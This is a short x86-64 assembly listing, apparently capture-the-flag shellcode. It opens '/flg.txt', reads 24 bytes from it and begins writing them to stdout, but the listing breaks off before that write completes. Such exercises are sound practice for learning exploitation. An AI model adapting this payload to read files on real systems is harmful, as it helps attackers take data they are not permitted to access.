global _start
section .text
_start:
    push 0
    mov rdi, '/flg.txt'
    push rdi
    mov al, 2
    mov rdi, rsp
    mov sil, 0
    syscall
    lea rsi, [rdi]
    mov rdi, rax
    mov al, 0
    mov edx, 24
    syscall
    mov al, 1
    mov dil, 1
